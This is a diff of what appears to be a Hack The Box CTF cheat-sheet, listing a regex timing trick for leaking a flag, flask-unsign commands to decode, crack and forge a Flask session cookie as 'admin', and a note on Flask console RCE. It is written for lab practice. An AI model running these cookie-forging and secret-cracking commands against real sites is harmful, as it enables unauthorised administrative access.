@@ -6,8 +6,8 @@
 // ^(?=HTB{f)(((([a-zA-Z0-9{_])*)*)*)$
 // if the flag starts with HTB{f if would take long time otherwise a short time
 //* flusk cookies unsign
-// flask-unsign --decode --cookie 'eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIFBsZWFzZSB0cnkgYWdhaW4uIl19XX0.aTC_CA.ZJ2lGWYijX-IXpcR36Ox2VeawL8'
-// flask-unsign --unsign --cookie '.eJxFjEEKgDAMBL-ie-4L-gZ_IEVE01iILTTNSfp3exA8LTMw-2CLsutFCr8-mNoYqB0HqcJhKZzy9HE0mRF6cBgJw2cTcZDCTOeWMnyrRg61CMGDjbSNC1Oqeb9_1V8F6ies.aSMmOQ.XpsfjpEWKdpEJ7Sbv60Q90S8Xyo' --wordlist 'flask.txt'
+// flask-unsign --decode --cookie 'InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs'
+// flask-unsign --unsign --cookie 'InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs' --wordlist 'flask.txt'
 // flask-unsign --sign --cookie "{'role' : 'admin'}" --secret theabyss
 //* flask Console RCE
 // go to /console
